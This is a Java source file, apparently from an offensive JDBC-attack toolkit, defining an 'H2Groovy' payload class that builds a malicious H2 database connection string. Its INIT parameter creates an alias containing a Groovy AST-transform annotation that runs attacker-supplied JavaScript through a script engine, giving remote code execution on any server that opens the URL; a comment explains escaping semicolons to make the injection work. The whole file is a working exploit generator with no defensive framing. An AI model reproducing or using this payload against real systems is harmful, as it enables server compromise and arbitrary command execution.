package cn.butler.jdbcattack.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import cn.butler.utils.StringUtils;

public class H2Groovy implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String randStr = StringUtils.getRandStr(3);

        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",command);
        String code = JSExpression.unsafeExpressModify((byte[]) objects[1]);
        String groovy = String.format("@groovy.transform.ASTTest(value={\n" +
            "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"%s\")" +
            "})" +
            "def x",code);

        String INITParameter = String.format("CREATE ALIAS %s AS $$%s$$",randStr,groovy);
        //转义分号: 因为在H2的连接串中分号是SQL语句分隔符,所以INIT配置参数中所有的分号都要设置转义,Groovy又不能转义奇怪
        INITParameter = INITParameter.replace(";", "\\;"); // 替换反斜杠
        String createAliasTemplate = "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=" + INITParameter;
        return createAliasTemplate;
    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(H2Groovy.class, args);
    }
}
